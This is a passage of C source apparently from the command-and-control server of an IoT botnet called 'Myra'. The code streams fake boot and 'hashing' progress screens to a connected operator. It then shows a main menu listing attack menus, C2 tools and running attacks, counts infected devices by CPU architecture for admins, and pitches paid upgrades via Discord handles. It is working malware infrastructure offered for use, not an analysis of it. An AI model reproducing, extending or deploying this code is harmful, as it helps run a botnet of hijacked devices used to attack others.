  //    if(send(clear_myra_broadcast, substrate_boot2, strlen(substrate_boot2), MSG_NOSIGNAL) == -1) goto finish_integer;
  //}
  char new_line2[500];
  char verbose_boot_21[500];
  char verbose_boot_22[500];
  char verbose_boot_23[500];
  char verbose_boot_24[500];
  char verbose_boot_25[500];
  char verbose_boot_26[500];
  char verbose_boot_27[500];
  char verbose_boot_28[500];
  char verbose_boot_29[500];
  char verbose_boot_30[500];
  char verbose_boot_31[500];
  char verbose_boot_32[500];
  char verbose_boot_33[500];
  char verbose_boot_34[500];
  char verbose_boot_35[500];
  char verbose_boot_36[500];
  char verbose_boot_37[500];
  char verbose_boot_38[500];
  char verbose_boot_39[500];
  char verbose_boot_40[500];
  char verbose_boot_41[500];
  sprintf(new_line2, "\r\n");
  sprintf(verbose_boot_21, "\e[38;5;134mDependencies have been revised..\r\n");
  sprintf(verbose_boot_22, "\e[38;5;134mReinitiating presets.. \r\n");
  sprintf(verbose_boot_23, "\e[38;5;134mSetting /var/enumerate/myra/cipher/encryption/K_LOGIN : [Accepted!]\r\n");
  sprintf(verbose_boot_24, "\e[38;5;134mSetting /var/enumerate/myra/rsa/hash_sets/masking_sck : [Accepted!]\r\n");
  sprintf(verbose_boot_25, "\e[38;5;134mSetting /var/enumerate/myra/logins/user/token_udid_b4 : [Accepted!]\r\n");
  sprintf(verbose_boot_26, "\e[38;5;134mSetting /var/enumerate/myra/c2/network/epoll_event/v4 : [Accepted!]\r\n");
  sprintf(verbose_boot_27, "\e[38;5;134mSetting /var/enumerate/myra/backup/metadata/memry_reg : [Accepted!]\r\n");
  sprintf(verbose_boot_28, "\e[38;5;134mSetting /var/enumerate/compression/version_5 : [Failed!]\r\n");
  sprintf(verbose_boot_29, "\e[38;5;134mMyra's memory_reg isn't working! Uh oh !\r\n");
  sprintf(verbose_boot_30, "\e[38;5;134mDetecting Myra-Build..\r\n");
  sprintf(verbose_boot_31, "\e[38;5;134mResetting..\r\n");
  sprintf(verbose_boot_32, "\e[38;5;134mReset has failed..\r\n");
  sprintf(verbose_boot_33, "\e[38;5;134mDynamically setting new buffer..\r\n");
  sprintf(verbose_boot_34, "\e[38;5;134mChecking reflector directories, We should be all good to go !\r\n");
  sprintf(verbose_boot_35, "\e[38;5;134mLogging user data via mach_swap.. Hopefully this doesn't crash..\r\n");
  sprintf(verbose_boot_36, "\e[38;5;134mSubstrate is detecting too much software interruptions..\r\n");
  sprintf(verbose_boot_37, "\e[38;5;134mDecreasing encryption_rounds.. \r\n");
  sprintf(verbose_boot_38, "\e[38;5;134mExceeding CPU limitation, Manually setting presets..\r\n");
  sprintf(verbose_boot_39, "\e[38;5;134mLoading device payloads..\r\n");
  sprintf(verbose_boot_40, "\e[38;5;134mDevice payloads set successfully..\r\n");
  sprintf(verbose_boot_41, "\e[38;5;134mSwapping memory registers..\r\n");
  if (send(clear_myra_broadcast, new_line2, strlen(new_line2), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  usleep(100000);
  if (send(clear_myra_broadcast, verbose_boot_21, strlen(verbose_boot_21), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  usleep(100000);
  if (send(clear_myra_broadcast, verbose_boot_22, strlen(verbose_boot_22), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  usleep(100000);
  if (send(clear_myra_broadcast, verbose_boot_23, strlen(verbose_boot_23), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  usleep(100000);
  if (send(clear_myra_broadcast, verbose_boot_24, strlen(verbose_boot_24), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  usleep(100000);
  if (send(clear_myra_broadcast, verbose_boot_25, strlen(verbose_boot_25), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  usleep(100000);
  if (send(clear_myra_broadcast, verbose_boot_26, strlen(verbose_boot_26), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  usleep(100000);
  if (send(clear_myra_broadcast, verbose_boot_27, strlen(verbose_boot_27), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  usleep(100000);
  if (send(clear_myra_broadcast, verbose_boot_28, strlen(verbose_boot_28), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  usleep(100000);
  if (send(clear_myra_broadcast, verbose_boot_29, strlen(verbose_boot_29), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  usleep(100000);
  if (send(clear_myra_broadcast, verbose_boot_30, strlen(verbose_boot_30), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  usleep(100000);
  if (send(clear_myra_broadcast, verbose_boot_31, strlen(verbose_boot_31), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  usleep(100000);
  if (send(clear_myra_broadcast, verbose_boot_32, strlen(verbose_boot_32), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  usleep(100000);
  if (send(clear_myra_broadcast, verbose_boot_33, strlen(verbose_boot_33), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  usleep(100000);
  if (send(clear_myra_broadcast, verbose_boot_34, strlen(verbose_boot_34), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  usleep(100000);
  if (send(clear_myra_broadcast, verbose_boot_35, strlen(verbose_boot_35), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  usleep(100000);
  if (send(clear_myra_broadcast, verbose_boot_36, strlen(verbose_boot_36), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  usleep(100000);
  if (send(clear_myra_broadcast, verbose_boot_37, strlen(verbose_boot_37), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  usleep(100000);
  if (send(clear_myra_broadcast, verbose_boot_38, strlen(verbose_boot_38), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  usleep(100000);
  if (send(clear_myra_broadcast, verbose_boot_39, strlen(verbose_boot_39), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  usleep(100000);
  if (send(clear_myra_broadcast, verbose_boot_40, strlen(verbose_boot_40), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  usleep(100000);
  if (send(clear_myra_broadcast, verbose_boot_41, strlen(verbose_boot_41), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  {
    char spaces[80];

    /* Assume an 80-column screen */
    /* The 'progress: |' is 11 characters */
    /* There should be space for '| 100%' after it */
    /* So that's 17 characters overhead. */
    /* We'll use 60 characters for the bar (not using 3) */

    memset(spaces, ' ', 60);
    spaces[60] = '\0';

    int oldbar = 0;
    for (int i = 0; i <= 100; i++)
    {
      /* Length of bar = (i * 60) / 100 */
      int newbar = (i * 60) / 100;
      if (oldbar != newbar)
        spaces[newbar - 1] = '=';
      char poop[500];
      sprintf(poop, "\rHashme_VI: [%s] %3d%%", spaces, i);
      oldbar = newbar;
      usleep(20000);
      if (send(clear_myra_broadcast, poop, strlen(poop), MSG_NOSIGNAL) == -1)
        goto finish_integer;
    }
    usleep(100000);
  }
  char new_line3[500];
  char verbose_boot_42[500];
  char verbose_boot_43[500];
  char verbose_boot_44[500];
  char verbose_boot_45[500];

  sprintf(new_line3, "\r\n");
  sprintf(verbose_boot_42, "\e[38;5;134mHashing has been executed ! Cannot write data anymore !\r\n");
  sprintf(verbose_boot_43, "\e[38;5;134mSaving metadata..\r\n");
  sprintf(verbose_boot_44, "\e[38;5;134mSaved !\r\n");
  sprintf(verbose_boot_45, "\e[38;5;134mFinalising.. Enumerating Myra V..\r\n");
  usleep(100000);
  if (send(clear_myra_broadcast, new_line3, strlen(new_line3), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, verbose_boot_42, strlen(verbose_boot_42), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  usleep(100000);
  if (send(clear_myra_broadcast, verbose_boot_43, strlen(verbose_boot_43), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  usleep(100000);
  if (send(clear_myra_broadcast, verbose_boot_44, strlen(verbose_boot_44), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  usleep(100000);
  if (send(clear_myra_broadcast, verbose_boot_45, strlen(verbose_boot_45), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  {
    char spaces[80];

    /* Assume an 80-column screen */
    /* The 'progress: |' is 11 characters */
    /* There should be space for '| 100%' after it */
    /* So that's 17 characters overhead. */
    /* We'll use 60 characters for the bar (not using 3) */

    memset(spaces, ' ', 60);
    spaces[60] = '\0';

    int oldbar = 0;
    for (int i = 0; i <= 100; i++)
    {
      /* Length of bar = (i * 60) / 100 */
      int newbar = (i * 60) / 100;
      if (oldbar != newbar)
        spaces[newbar - 1] = '=';
      char poop[500];
      sprintf(poop, "\rBinding_EPL: [%s] %3d%%", spaces, i);
      oldbar = newbar;
      usleep(20000);
      if (send(clear_myra_broadcast, poop, strlen(poop), MSG_NOSIGNAL) == -1)
        goto finish_integer;
    }
    usleep(100000);
  }
  char new_line4[500];
  sprintf(new_line4, "\r\n");
  if (send(clear_myra_broadcast, new_line4, strlen(new_line4), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  {
    char spaces[80];

    /* Assume an 80-column screen */
    /* The 'progress: |' is 11 characters */
    /* There should be space for '| 100%' after it */
    /* So that's 17 characters overhead. */
    /* We'll use 60 characters for the bar (not using 3) */

    memset(spaces, ' ', 60);
    spaces[60] = '\0';

    int oldbar = 0;
    for (int i = 0; i <= 100; i++)
    {
      /* Length of bar = (i * 60) / 100 */
      int newbar = (i * 60) / 100;
      if (oldbar != newbar)
        spaces[newbar - 1] = '=';
      char poop[500];
      sprintf(poop, "\rObjct_ASCII: [%s] %3d%%", spaces, i);
      oldbar = newbar;
      usleep(20000);
      if (send(clear_myra_broadcast, poop, strlen(poop), MSG_NOSIGNAL) == -1)
        goto finish_integer;
    }
    usleep(100000);
  }
  char new_line5[500];
  sprintf(new_line5, "\r\n");
  if (send(clear_myra_broadcast, new_line5, strlen(new_line5), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  char verbose_boot_46[500];
  sprintf(verbose_boot_46, "\e[38;5;134mFinalising.. Enumeration in process..\r\n");
  if (send(clear_myra_broadcast, verbose_boot_46, strlen(verbose_boot_46), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  {
    char spaces[80];

    /* Assume an 80-column screen */
    /* The 'progress: |' is 11 characters */
    /* There should be space for '| 100%' after it */
    /* So that's 17 characters overhead. */
    /* We'll use 60 characters for the bar (not using 3) */

    memset(spaces, ' ', 60);
    spaces[60] = '\0';

    int oldbar = 0;
    for (int i = 0; i <= 100; i++)
    {
      /* Length of bar = (i * 60) / 100 */
      int newbar = (i * 60) / 100;
      if (oldbar != newbar)
        spaces[newbar - 1] = '=';
      char poop[500];
      sprintf(poop, "\rEnumerating: [%s] %3d%%", spaces, i);
      oldbar = newbar;
      usleep(20000);
      if (send(clear_myra_broadcast, poop, strlen(poop), MSG_NOSIGNAL) == -1)
        goto finish_integer;
    }
    usleep(100000);
  } /* Finalising Login System. */
  //char new_line6 [500];
  //sprintf(new_line6, "\r\n");
  //if (send(clear_myra_broadcast, new_line6, strlen(new_line6), MSG_NOSIGNAL) == -1) goto finish_integer;
  //char substrate_boot3 [5000];
  //for (i = 0; i < 100000; i++){
  //    sprintf(substrate_boot3, "\r\e[38;5;134mAllocating Resources..\e[38;5;134m [\e[38;5;168m%d%\e[38;5;134m]", i/1000);
  //    fflush(stdout);
  //    if(send(clear_myra_broadcast, substrate_boot3, strlen(substrate_boot3), MSG_NOSIGNAL) == -1) goto finish_integer;
  //}
  //char new_line7 [500];
  //sprintf(new_line7, "\r\n");
  //if (send(clear_myra_broadcast, new_line7, strlen(new_line7), MSG_NOSIGNAL) == -1) goto finish_integer;
  //char substrate_boot4 [5000];
  //for (i = 0; i < 100000; i++){
  //    sprintf(substrate_boot4, "\r\e[38;5;134mOverwriting Modular Dependencies.. \e[38;5;134m [\e[38;5;168m%d%\e[38;5;134m]", i/1000);
  //    fflush(stdout);
  //    if(send(clear_myra_broadcast, substrate_boot4, strlen(substrate_boot4), MSG_NOSIGNAL) == -1) goto finish_integer;
  //}
  //char new_line8 [500];
  //sprintf(new_line8, "\r\n");
  //if (send(clear_myra_broadcast, new_line8, strlen(new_line8), MSG_NOSIGNAL) == -1) goto finish_integer;
  //char substrate_boot5 [5000];
  //for (i = 0; i < 100000; i++){
  //    sprintf(substrate_boot5, "\r\e[38;5;134mRemoving Older Modules.. Cleaning Up Filesystem..\e[38;5;134m [\e[38;5;168m%d%\e[38;5;134m]", i/1000);
  //    fflush(stdout);
  //    if(send(clear_myra_broadcast, substrate_boot5, strlen(substrate_boot5), MSG_NOSIGNAL) == -1) goto finish_integer;
  //}
  //char new_line9 [500];
  //sprintf(new_line9, "\r\n");
  //if (send(clear_myra_broadcast, new_line9, strlen(new_line9), MSG_NOSIGNAL) == -1) goto finish_integer;
  //char substrate_boot6 [5000];
  //for (i = 0; i < 100000; i++){
  //    sprintf(substrate_boot6, "\r\e[38;5;134mRestoring Substrate..\e[38;5;134m [\e[38;5;168m%d%\e[38;5;134m]", i/1000);
  //    fflush(stdout);
  //    if(send(clear_myra_broadcast, substrate_boot6, strlen(substrate_boot6), MSG_NOSIGNAL) == -1) goto finish_integer;
  //}
  //sprintf(verbose_boot_21, "\e[38;5;134mDependencies have been revised..\r\n");
  //sprintf(verbose_boot_21, "\e[38;5;134mDependencies have been revised..\r\n");
  //sprintf(verbose_boot_21, "\e[38;5;134mDependencies have been revised..\r\n");
  //sprintf(verbose_boot_21, "\e[38;5;134mDependencies have been revised..\r\n");
  //sprintf(verbose_boot_21, "\e[38;5;134mDependencies have been revised..\r\n");
  //sprintf(verbose_boot_21, "\e[38;5;134mDependencies have been revised..\r\n");
  //sprintf(verbose_boot_21, "\e[38;5;134mDependencies have been revised..\r\n");
  //sprintf(verbose_boot_21, "\e[38;5;134mDependencies have been revised..\r\n");
  //sprintf(verbose_boot_21, "\e[38;5;134mDependencies have been revised..\r\n");

  char showme[500];
  char main01[500];
  char main02[500];
  char main03[500];
  char main04[500];
  char main05[500];
  char main06[500];
  char main07[500];
  char main08[500];
  char main09[500];
  char main10[500];
  char main11[500];
  char main12[500];
  char main13[500];
  char main14[500];
  char main15[500];
  char main16[500];
  char main17[500];
  char main18[500];
  char main19[500];
  char main20[500];
  char main21[500];
  char main22[500];
  char main23[500];
  sprintf(showme, "\e[?25h");
  sprintf(main01, "\e[38;5;225m╔═══════════════════════════════════════════╗╔═════════════════════════════════╗\r\n");
  sprintf(main02, "\e[38;5;225m║ \e[38;5;168mWelcome To The \e[38;5;134mMyra Initiative\e[38;5;225m.           ║║  \e[38;5;168mProject Myra \e[38;5;134mV\e[38;5;225m.                ║\r\n");
  sprintf(main03, "\e[38;5;225m║ \e[38;5;168mTill We Fall\e[38;5;225m. \e[38;5;168m2020\e[38;5;225m. ╔═════════════════════╝╚╗ \e[38;5;168mPrivate \e[38;5;134mDeveloper's Edition\e[38;5;225m.   ║\r\n");
  sprintf(main04, "\e[38;5;225m╚═════════════════════╝╔═════════════════════╗╚═════════════╗  \e[38;5;168mBuild \e[38;5;134m44\e[38;5;225m.       ║\r\n");
  sprintf(main05, "\e[38;5;225m╔════════════════════╗ ║ \e[38;5;134mTransmissional\e[38;5;225m.     ║╔═══════════╗ ╚══════════════════╝\r\n");
  sprintf(main06, "\e[38;5;225m║   \e[38;5;168mC2 \e[38;5;134mX \e[38;5;168mSubstrate   \e[38;5;225m║ ║ \e[38;5;134mCapabilities Exceed\e[38;5;225m.║║   \e[38;5;134mXVII\e[38;5;225m.   ║ ╔══════════════════╗\r\n");
  sprintf(main07, "\e[38;5;225m╚════════════════════╝ ╚═════════════════════╝╚═══════════╝ ║    \e[38;5;134mMain Menu\e[38;5;225m.    \e[38;5;225m║\r\n");
  sprintf(main08, "\e[38;5;225m╔════════════════════════════╗╔═════════════════════════════╝                  \e[38;5;225m║\r\n");
  sprintf(main09, "\e[38;5;225m║ \e[38;5;168mSTATE\e[38;5;225m.......\e[38;5;168m: \e[38;5;134mPRIVATE      \e[38;5;225m║║ \e[38;5;134m.\e[38;5;168mhelp    \e[38;5;225m- \e[38;5;168mDisplays Full Command List          \e[38;5;225m║\r\n");
  sprintf(main10, "\e[38;5;225m║ \e[38;5;168mHYPERPOWER\e[38;5;225m..\e[38;5;168m: \e[38;5;134mIII          \e[38;5;225m║║ \e[38;5;134m.\e[38;5;168mipmi    \e[38;5;225m- \e[38;5;168mDisplays Attack Menu I              \e[38;5;225m║\r\n");
  sprintf(main11, "\e[38;5;225m║ \e[38;5;168mVERSION\e[38;5;225m.....\e[38;5;168m: \e[38;5;134mB44          \e[38;5;225m║║ \e[38;5;134m.\e[38;5;168miphm    \e[38;5;225m- \e[38;5;168mDisplays Attack Menu II             \e[38;5;225m║\r\n");
  sprintf(main12, "\e[38;5;225m║ \e[38;5;168mSCKET_INT\e[38;5;225m...\e[38;5;168m: \e[38;5;134mINSTNC III   \e[38;5;225m║║ \e[38;5;134m.\e[38;5;168mtools   \e[38;5;225m- \e[38;5;168mLists Available C2 Tools            \e[38;5;225m║\r\n");
  sprintf(main13, "\e[38;5;225m║ \e[38;5;168mLSC\e[38;5;225m.........\e[38;5;168m: \e[38;5;134mGL3.0        \e[38;5;225m║║ \e[38;5;134m.\e[38;5;168mclear   \e[38;5;225m- \e[38;5;168mClears C2 Screen                    \e[38;5;225m║\r\n");
  sprintf(main14, "\e[38;5;225m║ \e[38;5;168mDESC\e[38;5;225m........\e[38;5;168m: \e[38;5;134mC2XTLNT      \e[38;5;225m║║ \e[38;5;134m.\e[38;5;168mstatus  \e[38;5;225m- \e[38;5;168mShows Network Status                \e[38;5;225m║\r\n");
  sprintf(main15, "\e[38;5;225m║ \e[38;5;168mALGORITHM\e[38;5;225m...\e[38;5;168m: \e[38;5;134mAES-512      \e[38;5;225m║║ \e[38;5;134m.\e[38;5;168mhashme  \e[38;5;225m- \e[38;5;168mRandomises Hashing Algorithm        \e[38;5;225m║\r\n");
  sprintf(main16, "\e[38;5;225m║ \e[38;5;168mPRJ-VAS\e[38;5;225m.....\e[38;5;168m: \e[38;5;134m84-34-243    \e[38;5;225m║║ \e[38;5;134m.\e[38;5;168mlogout  \e[38;5;225m- \e[38;5;168mLog Out Of The Network Securely     \e[38;5;225m║\r\n");
  sprintf(main17, "\e[38;5;225m║ \e[38;5;168mCCR\e[38;5;225m.........\e[38;5;168m: \e[38;5;134mXX-3345-24   \e[38;5;225m║║ \e[38;5;134m.\e[38;5;168mhyper   \e[38;5;225m- \e[38;5;168mReinitialises Attack via Hyperpower \e[38;5;225m║\r\n");
  sprintf(main18, "\e[38;5;225m║ \e[38;5;168mDATA_TRMIT\e[38;5;225m..\e[38;5;168m: \e[38;5;134mACTIVE       \e[38;5;225m║║ \e[38;5;134m.\e[38;5;168mcreds   \e[38;5;225m- \e[38;5;168mDisplays Developers / Special Thnks \e[38;5;225m║\r\n");
  sprintf(main19, "\e[38;5;225m║ \e[38;5;168mSRVERS_ON\e[38;5;225m...\e[38;5;168m: \e[38;5;134m2            \e[38;5;225m║║ \e[38;5;134m.\e[38;5;168mattacks \e[38;5;225m- \e[38;5;168mDisplays Running Attacks            \e[38;5;225m║\r\n");
  sprintf(main20, "\e[38;5;225m╚════════════════════════════╝╚════════════════════════════════════════════════╝\r\n");
  sprintf(main21, "\e[38;5;225m╔════════════════════════════╗╔════════════════════════════════════════════════╗\r\n");
  sprintf(main22, "\e[38;5;225m║ \e[38;5;168mLast Update \e[38;5;225m- \e[38;5;168m[\e[38;5;225m21\e[38;5;168m/\e[38;5;225m04\e[38;5;168m/\e[38;5;225m2020\e[38;5;168m] \e[38;5;225m║║      \e[38;5;134mMyra \e[38;5;168mNetwork System Status\e[38;5;134m: \e[38;5;225mActive \e[38;5;134m!      \e[38;5;225m║\r\n");
  sprintf(main23, "\e[38;5;225m╚════════════════════════════╝╚════════════════════════════════════════════════╝\r\n");
  if (send(clear_myra_broadcast, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, showme, strlen(showme), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, main01, strlen(main01), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, main02, strlen(main02), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, main03, strlen(main03), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, main04, strlen(main04), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, main05, strlen(main05), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, main06, strlen(main06), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, main07, strlen(main07), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, main08, strlen(main08), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, main09, strlen(main09), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, main10, strlen(main10), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, main11, strlen(main11), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, main12, strlen(main12), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, main13, strlen(main13), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, main14, strlen(main14), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, main15, strlen(main15), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, main16, strlen(main16), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, main17, strlen(main17), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, main18, strlen(main18), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, main19, strlen(main19), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, main20, strlen(main20), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, main21, strlen(main21), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, main22, strlen(main22), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, main23, strlen(main23), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  while (1)
  {                                                                                                                                                                   // We are Displaying Attempting to display main banner!
    sprintf(myra, "\e[38;5;134m[\e[38;5;225m%s\e[38;5;134m@\e[38;5;168mMyra\e[38;5;134m]\e[38;5;154m$\e[38;5;168m ", accounts[find_line].username, myra_buffer_size); // We are Displaying Attempting to display main banner!
    if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
      goto finish_integer; // We are Displaying Attempting to display main banner!
    break;                 // World Break!
  }                        // We are Displaying Attempting to display main banner!
  //TESTICLESpthread_create(&title, NULL, &myra_title_creator, sock); // We are Displaying Attempting to display main banner!
  managements[clear_myra_broadcast].transmitted_successfully = 1; // We are Displaying Attempting to display main banner!

  while (buffer_size_string_compare(myra_buffer_size, sizeof myra_buffer_size, clear_myra_broadcast) > 0) // Buffer Size, Stated Less Than 0, This Allows Consistent Connection
  {
    if (strstr(myra_buffer_size, ".fishy")) // Output For Command - '.bots'
    {
      if (strcmp(Admin, accounts[find_line].identification_type) == 0) // Check If User Is Admin
      {
        char total_output[128]; // Char Every Line For Output Communication -- 128 byte
        char mips[128];         // Char Every Line For Output Communication
        char sh4[128];          // Char Every Line For Output Communication
        char arm[128];          // Char Every Line For Output Communication
        char ppc[128];          // Char Every Line For Output Communication
        char x86[128];          // Char Every Line For Output Communication
        char spc[128];          // Char Every Line For Output Communication
        char bot_1[5000];       // Char Every Line For Output Communication
        char bot_2[5000];       // Char Every Line For Output Communication
        char bot_3[5000];       // Char Every Line For Output Communication
        char bot_4[5000];       // Char Every Line For Output Communication

        sprintf(bot_1, "\e[38;5;225m╔════════════════════════════════════════════╗\r\n");                                                                       // Display Menu - Device Count - [ARCH DETECTION BROKEN, THIS IS STILL IN BETA]
        sprintf(bot_2, "\e[38;5;225m║ \e[38;5;168mMyra I \e[38;5;225m- \e[38;5;168mDevice Listing \e[38;5;225m- \e[38;5;168mArch Detection \e[38;5;225m║\r\n"); // Display Menu - Device Count - [ARCH DETECTION BROKEN, THIS IS STILL IN BETA]
        sprintf(bot_3, "\e[38;5;225m╠════════════════════════════════════════════╣\r\n");
        sprintf(mips, "\e[38;5;225m║ \e[38;5;168mMips Devices: \e[38;5;225m%d                            \e[38;5;225m║\r\n", myra_mipsel_connected());          // Display Menu - Device Count - [ARCH DETECTION BROKEN, THIS IS STILL IN BETA]
        sprintf(arm, "\e[38;5;225m║ \e[38;5;168mArm Devices: \e[38;5;225m%d                             \e[38;5;225m║\r\n", myra_arm_connected());              // Display Menu - Device Count - [ARCH DETECTION BROKEN, THIS IS STILL IN BETA]
        sprintf(sh4, "\e[38;5;225m║ \e[38;5;168mSh4 Devices: \e[38;5;225m%d                             \e[38;5;225m║\r\n", myra_sh4_connected());              // Display Menu - Device Count - [ARCH DETECTION BROKEN, THIS IS STILL IN BETA]
        sprintf(ppc, "\e[38;5;225m║ \e[38;5;168mPpc Devices: \e[38;5;225m%d                             \e[38;5;225m║\r\n", myra_ppc_connected());              // Display Menu - Device Count - [ARCH DETECTION BROKEN, THIS IS STILL IN BETA]
        sprintf(x86, "\e[38;5;225m║ \e[38;5;168mx86 Devices: \e[38;5;225m%d                             \e[38;5;225m║\r\n", myra_x86_connected());              // Display Menu - Device Count - [ARCH DETECTION BROKEN, THIS IS STILL IN BETA]
        sprintf(spc, "\e[38;5;225m║ \e[38;5;168mSpc Devices: \e[38;5;225m%d                             \e[38;5;225m║\r\n", myra_spc_connected());              // Display Menu - Device Count - [ARCH DETECTION BROKEN, THIS IS STILL IN BETA]
        sprintf(total_output, "\e[38;5;225m║ \e[38;5;168mTotal IoT Devices: \e[38;5;225m%d                       \e[38;5;225m║\r\n", myra_clients_connected()); // Display Menu - Device Count - [ARCH DETECTION BROKEN, THIS IS STILL IN BETA]
        sprintf(bot_4, "\e[38;5;225m╚════════════════════════════════════════════╝\r\n");
        if (send(clear_myra_broadcast, bot_1, strlen(bot_1), MSG_NOSIGNAL) == -1)
          goto finish_integer; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if (send(clear_myra_broadcast, bot_2, strlen(bot_2), MSG_NOSIGNAL) == -1)
          goto finish_integer; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if (send(clear_myra_broadcast, bot_3, strlen(bot_3), MSG_NOSIGNAL) == -1)
          goto finish_integer; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if (send(clear_myra_broadcast, mips, strlen(mips), MSG_NOSIGNAL) == -1)
          goto finish_integer; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if (send(clear_myra_broadcast, sh4, strlen(sh4), MSG_NOSIGNAL) == -1)
          goto finish_integer; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if (send(clear_myra_broadcast, arm, strlen(arm), MSG_NOSIGNAL) == -1)
          goto finish_integer; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if (send(clear_myra_broadcast, ppc, strlen(ppc), MSG_NOSIGNAL) == -1)
          goto finish_integer; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if (send(clear_myra_broadcast, x86, strlen(x86), MSG_NOSIGNAL) == -1)
          goto finish_integer; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if (send(clear_myra_broadcast, spc, strlen(spc), MSG_NOSIGNAL) == -1)
          goto finish_integer; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if (send(clear_myra_broadcast, total_output, strlen(total_output), MSG_NOSIGNAL) == -1)
          goto finish_integer; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if (send(clear_myra_broadcast, bot_4, strlen(bot_4), MSG_NOSIGNAL) == -1)
          goto finish_integer; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
      else // If The User Is Not Admin, Then Use Else Statement To Carry Out Following Output
      {
        sprintf(myra, "\e[38;5;225m╔════════════════════════════════════════╗\r\n\e[38;5;225m║ \e[38;5;168mYou Do Not Have the needed Permissions \e[38;5;225m║\r\n\e[38;5;225m║      \e[38;5;168mTo View or use this command!      \e[38;5;225m║\r\n\e[38;5;225m╚═══════════════════════════════╦════════╝\r\n                                \e[38;5;225m║\r\n                                \e[38;5;225m║\r\n         \e[38;5;225m╔══════════════════════╩═══════════════════════════╗\r\n         \e[38;5;225m║   \e[38;5;168m Want An Upgrade? Dm Me or zach on discord!    \e[38;5;225m║\r\n         \e[38;5;225m║  \e[38;5;134mGeorgia Cri#4337 \e[38;5;225m-  \e[38;5;168mOwO  \e[38;5;225m- \e[38;5;134mTransmissional#9845  \e[38;5;225m║\r\n         \e[38;5;225m╚══════════════════════════════════════════════════╝\r\n");
        if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
          ; // // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
    }
    if (strstr(myra_buffer_size, ".HELP") || strstr(myra_buffer_size, ".help") || strstr(myra_buffer_size, ".Help")) // Help Command - Displays Help Menu
    {
      char help_cmd1[5000]; // Char Every Line For Output Communication
      sprintf(help_cmd1, "\e[38;5;225mI will add this menu once I feel like I have added enough commands.\r\n");
      if (send(clear_myra_broadcast, help_cmd1, strlen(help_cmd1), MSG_NOSIGNAL) == -1)
        goto finish_integer; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
